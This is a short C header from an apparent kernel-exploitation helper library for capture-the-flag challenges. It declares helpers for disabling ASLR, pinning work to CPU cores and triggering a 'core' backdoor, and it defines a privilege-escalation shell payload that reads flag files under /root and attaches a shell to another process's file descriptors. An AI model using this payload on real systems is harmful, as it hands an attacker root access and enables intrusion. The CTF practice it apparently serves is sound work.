#ifndef _KPWN_FLOW_
#define _KPWN_FLOW_

#include <kpwn/logger.h>
#include <stddef.h>

#define LPE_BILLY                  \
  "#!/bin/sh\nPID=`pidof billy`\n" \
  "/bin/cat /flag* /root/flag*\n"  \
  "/bin/sh >/proc/$PID/fd/1 </proc/$PID/fd/0 2>&1"

void noaslr(int argc, char *argv[]);

__attribute__((naked, noreturn)) void win();

void process_assign_to_core(int core_id);
void thread_assign_to_core(int core_id);

void trigger_corewin(const char *backdoor_file,
                     const char *backdoor_cmd);
void init_billy(char **argv);

#endif
